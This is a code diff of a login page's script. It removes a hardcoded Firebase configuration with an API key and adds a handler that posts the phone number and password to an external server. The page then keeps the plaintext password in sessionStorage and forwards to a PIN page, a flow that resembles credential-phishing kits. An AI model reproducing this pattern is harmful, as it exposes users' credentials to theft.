@@ -432,22 +432,7 @@ font-size:16px;
   
 <script type="module">
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyCvUTcjYusi7eHGYUvYkeeTPwWhmVuw4wI",
-  authDomain: "spro-deal-a87cd.firebaseapp.com",
-  databaseURL: "https://spro-deal-a87cd-default-rtdb.firebaseio.com",
-  projectId: "spro-deal-a87cd",
-  storageBucket: "spro-deal-a87cd.firebasestorage.app",
-  messagingSenderId: "881694010465",
-  appId: "1:881694010465:web:a91f60a585b36447458e20",
-  measurementId: "G-0KHC1X0DC6"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
 
 const phone = document.getElementById("phone");
 const password = document.getElementById("password");
@@ -466,19 +451,52 @@ password.addEventListener("input", validate);
 
 const loading = document.getElementById("loading");
 
-btn.addEventListener("click", function () {
+btn.addEventListener("click", async function () {
 
     if (!btn.classList.contains("active")) return;
-
-    sessionStorage.setItem("phone", phone.value);
-    sessionStorage.setItem("password", password.value);
 
     loading.style.display = "flex";
     btn.disabled = true;
 
-    setTimeout(() => {
-        window.location.href = "pin.html";
-    }, 100);
+    try {
+
+        const response = await fetch("https://sprodeall-upwv.onrender.com/login", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                phone: phone.value.trim(),
+                password: password.value.trim()
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+
+            sessionStorage.setItem("phone", phone.value);
+            sessionStorage.setItem("password", password.value);
+
+            window.location.href = "pin.html";
+
+        } else {
+
+            alert(result.message || "Login Failed");
+
+            btn.disabled = false;
+            loading.style.display = "none";
+
+        }
+
+    } catch (e) {
+
+        alert("Server Error");
+
+        btn.disabled = false;
+        loading.style.display = "none";
+
+    }
 
 });
 
